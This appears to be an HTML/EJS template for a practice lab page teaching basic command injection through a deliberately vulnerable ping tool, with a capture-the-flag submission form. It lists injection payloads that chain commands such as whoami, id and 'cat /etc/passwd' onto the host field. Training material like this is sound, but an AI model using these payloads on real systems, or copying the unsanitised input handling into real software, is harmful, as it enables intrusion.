<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Basic Command Injection - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/cmd-injection"><i class="fas fa-flask"></i> CMD Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>⚡ Basic Command Injection</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span><span class="lab-tag points"><i class="fas fa-star"></i> 25 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>This network diagnostic tool runs ping against the specified host. The input is passed directly to the system command. Inject additional commands to achieve RCE.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Network Ping Tool</h2>
      <form method="POST" action="/labs/cmd-injection/basic/ping" class="vulnerable-form">
        <label>Host to ping:</label>
        <input type="text" name="host" value="<%= host %>" placeholder="8.8.8.8" autocomplete="off">
        <button type="submit"><i class="fas fa-wifi"></i> Ping</button>
      </form>
      <% if (output) { %><div class="result-box"><pre><%= output %></pre></div><% } %>
      <div class="code-block">Injection payloads:
8.8.8.8; whoami
8.8.8.8 | cat /etc/passwd
8.8.8.8 && id
8.8.8.8 || ls -la
`id`
$(whoami)</div>
    </div>
    <div class="flag-submit">
      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('cmd-injection','flagInput_cmd','flagResult_cmd'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_cmd" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_cmd" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
</body>
</html>
